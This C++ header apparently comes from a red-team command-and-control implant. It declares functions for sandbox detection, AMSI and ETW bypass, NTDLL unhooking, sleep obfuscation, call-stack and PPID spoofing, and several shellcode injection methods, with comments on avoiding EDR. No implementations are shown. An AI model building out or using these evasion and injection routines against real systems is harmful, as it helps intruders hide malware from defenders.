#ifndef RTLC2_EVASION_H
#define RTLC2_EVASION_H

#include <cstdint>
#include <string>

namespace rtlc2 {
namespace evasion {

// --- Sleep & Anti-Analysis ---

// Obfuscated sleep with jitter
void ObfuscatedSleep(int base_seconds, int jitter_percent);

// Anti-sandbox checks
bool IsSandbox();
bool IsDebuggerPresent();
bool HasAnalysisTools();
bool IsVirtualMachine();
bool HasMinimumHardware(int min_cpus, int min_ram_gb);
bool TimingCheck();

#ifdef RTLC2_WINDOWS

// --- AMSI Bypass ---
bool PatchAmsiScanBuffer();
bool PatchAmsiOpenSession();
bool PatchAmsiInitialize();
bool AmsiProviderHijack();
bool BypassAMSI();

// --- ETW Evasion ---
bool PatchEtwEventWrite();
bool PatchNtTraceEvent();
bool PatchNtTraceControl();
bool DisableETWTI();
bool DisableETW();

// --- NTDLL Unhooking ---
bool UnhookNtdllFromKnownDlls();
bool UnhookNtdllFromDisk();
bool UnhookNtdllFromSuspendedProcess();
bool UnhookFunction(const char* functionName);
bool UnhookNtdll();

// --- Sleep Obfuscation ---
enum class SleepMethod : int {
    Basic    = 0,
    Ekko     = 1,
    Foliage  = 2,
};

void EncryptedSleep(int milliseconds, SleepMethod method);
bool EkkoSleep(DWORD milliseconds);
bool FoliageSleep(DWORD milliseconds);

// --- Stack Spoofing ---
bool InitStackSpoof();
void* GetSpoofedReturnAddress();

// --- PPID Spoofing ---
bool CreateProcessWithPPID(uint32_t parent_pid, const char* cmdline,
                           void** hProcess, void** hThread, uint32_t* child_pid);

// --- Argument Spoofing ---
bool CreateProcessWithSpoofedArgs(const char* real_cmdline, const char* fake_cmdline,
                                  void** hProcess, void** hThread, uint32_t* child_pid);

// --- Heap Encryption (during sleep) ---
void HeapEncrypt();
void HeapDecrypt();

// --- ETW Threat Intelligence Bypass ---
bool PatchAllEtwTi();

// --- Module Stomping ---
std::string GetStompableDLL(size_t minSize);
void* ModuleStomp(const std::string& dllPath, const void* shellcode, size_t shellcodeLen);
bool ExecuteStompedModule(void* addr);

// --- Environment Keying ---
bool EnvironmentKeyCheck(const char* domain, const char* user, const char* fileMarker);

// --- Hardware Breakpoint Hooks ---
// Uses debug registers (DR0-DR3) to hook API functions without modifying
// code pages. Maximum 4 simultaneous hooks.
bool SetHWBreakpoint(void* targetAddr, void* detourFunc, int drIndex);
bool RemoveHWBreakpoint(int drIndex);
bool InitHWBPHooks();
void CleanupHWBPHooks();
int  FindFreeDRSlot();

// --- Injection ---
namespace injection {

bool InjectCreateRemoteThread(uint32_t pid, const uint8_t* shellcode, size_t size);
bool InjectAPC(uint32_t pid, const uint8_t* shellcode, size_t size);
bool ProcessHollow(const char* target_exe, const uint8_t* payload, size_t size);
bool EarlyBirdInject(const char* target_exe, const uint8_t* shellcode, size_t size);

// Thread Hijack: suspend existing thread, redirect RIP/EIP to shellcode,
// appends trampoline to resume original execution after shellcode completes
bool InjectThreadHijack(uint32_t pid, uint32_t tid, const uint8_t* shellcode, size_t size);

// NtCreateSection Mapping: uses shared section to inject without VirtualAllocEx/WriteProcessMemory
// Avoids commonly-hooked allocation/write APIs (EDR evasion)
bool InjectNtCreateSection(uint32_t pid, const uint8_t* shellcode, size_t size);

// Pool Party (TP_WORK): abuses Windows Thread Pool work items to execute shellcode
// Uses TpAllocWork/TpPostWork from ntdll for stealthier execution
bool InjectPoolParty(uint32_t pid, const uint8_t* shellcode, size_t size);

// --- Threadless Injection ---
// Hijacks an IAT entry in a remote process to execute shellcode without
// creating a new thread. One-shot: IAT is restored after first execution.
bool ThreadlessInject(uint32_t pid, const uint8_t* shellcode, size_t size,
                      const char* targetDll, const char* targetFunc);

} // namespace injection

// --- Return Address Spoofing ---
// Calls a Windows API function while making the call stack appear to
// originate from a legitimate DLL. The 'gadget' parameter should point
// to a `ret` instruction inside a trusted module (e.g., ntdll.dll).
//
// Usage: SpoofedCall((void*)NtAllocateVirtualMemory, gadgetAddr, arg1, arg2, ...);
extern "C" void* SpoofedCall(void* func, void* gadget, ...);

#ifndef _WIN64
extern "C" void* SpoofedCall32(void* func, void* gadget, int nargs, ...);
#endif

#endif // RTLC2_WINDOWS

} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_EVASION_H
